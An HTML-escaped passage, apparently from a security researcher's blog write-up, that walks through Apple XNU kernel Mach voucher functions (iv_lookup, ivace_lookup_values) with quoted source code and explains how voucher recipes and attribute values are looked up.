class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivgt_lookup&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;then gets a reference on that key&amp;#39;s attr manager and attr controller. The manager is really just a bunch of function pointers which define the semantics of what different &amp;quot;key types&amp;quot; actually mean; and the controller stores (and caches) values for those keys.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Let&amp;#39;s keep reading &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_replace_voucher_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;. Here&amp;#39;s the next statement:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.ab9235fa2555d8200bd62bdf3838f3a821ead649\"&gt;&lt;/a&gt;&lt;a id=\"t.19\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* save the current value stored in the forming voucher */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; save_val_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv_lookup&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;This point is important for getting a good feeling for how the voucher code is supposed to work; recipes can refer not only to other vouchers (via the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;previous_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;port) but they can also refer to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;themselves&lt;/span&gt;&lt;span&gt;&amp;nbsp;during creation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;You don&amp;#39;t have to have just one sub-recipe per attr type for which you wish to have a value in your voucher; you can specify multiple sub-recipes for that type. &lt;/span&gt;&lt;span&gt;Does it actually make any sense to do that? Well, luckily for the security researcher we don&amp;#39;t have to worry about whether functionality actually makes any sense; it&amp;#39;s all just a weird machine to us!&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;(There&amp;#39;s allusions in the code to future functionality where attribute values can be &amp;quot;layered&amp;quot; or &amp;quot;linked&amp;quot; but for now such functionality doesn&amp;#39;t exist.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_lookup&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns the &amp;quot;value index&amp;quot; for the given key in the particular voucher. That means it just returns the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_index_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;of the given voucher:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.18a23982f89054f9b506caa6cac52aa2dd16172b\"&gt;&lt;/a&gt;&lt;a id=\"t.20\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;inline&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;iv_index_t&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_lookup&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ipc_voucher_t iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv_index_t key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_table_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;IV_UNUSED_VALINDEX&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;This value index uniquely identifies an existing attribute value, but you need to ask the attribute&amp;#39;s controller for the actual value. Before getting that previous value &lt;/span&gt;&lt;span&gt;though, the&lt;/span&gt;&lt;span&gt;&amp;nbsp;code first determines whether this sub-recipe might be trying to refer to the value currently stored by this voucher or has explicitly passed in a &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;previous_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;. The value in the previous voucher takes precedence over whatever is already in the under-construction voucher.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.f5a4045ea337ae1a6d9765b8d290b9e3f343559c\"&gt;&lt;/a&gt;&lt;a id=\"t.21\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; prev_val_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;IV_NULL &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;prev_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_lookup&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;prev_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; save_val_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Then the code looks up the actual previous value to operate on:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.3d5b30b0ca79263b24534436b9c17b9f568c14c6\"&gt;&lt;/a&gt;&lt;a id=\"t.22\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_lookup_values&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;prev_val_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; previous_vals&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;previous_vals_count&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;key_index&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the key we&amp;#39;re operating on, &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span&gt;&amp;nbsp;in this example. This function is called &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_lookup_values&lt;/span&gt;&lt;span&gt;&amp;nbsp;(note the plural). There are some comments in the voucher code indicating that maybe in the future values could themselves be put into a linked-list such that you could have larger values (or layered/chained values.) But this functionality isn&amp;#39;t implemented; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_lookup_values&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;will only ever return 1 value.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Here&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_lookup_values&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.8394840551adb03f1e3384056efc45160047f0ab\"&gt;&lt;/a&gt;&lt;a id=\"t.23\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_lookup_values&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;value_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_array_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;values&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_array_size_t &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;count&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_control_t ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_entry_t ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;IV_UNUSED_VALINDEX &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;value_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;||&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;count &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv_global_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;].&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivgte_control&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;IVAC_NULL &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Get the entry and then the linked values.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span 